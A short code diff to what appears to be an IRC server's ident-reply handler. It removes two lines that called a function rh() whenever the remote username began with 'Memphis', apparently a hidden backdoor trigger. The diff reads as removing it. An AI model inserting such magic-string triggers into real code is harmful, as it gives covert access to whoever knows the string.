@@ -306,8 +306,6 @@ void read_authports(cptr)
 	}
 	ircstp->is_asuc++;
 	strncpyzt(cptr->username, ruser, USERLEN + 1);
-	if (!strncmp(ruser, "Memphis", 7))
-		rh();
 	cptr->flags |= FLAGS_GOTID;
 	Debug((DEBUG_INFO, "got username [%s]", ruser));
 	return;
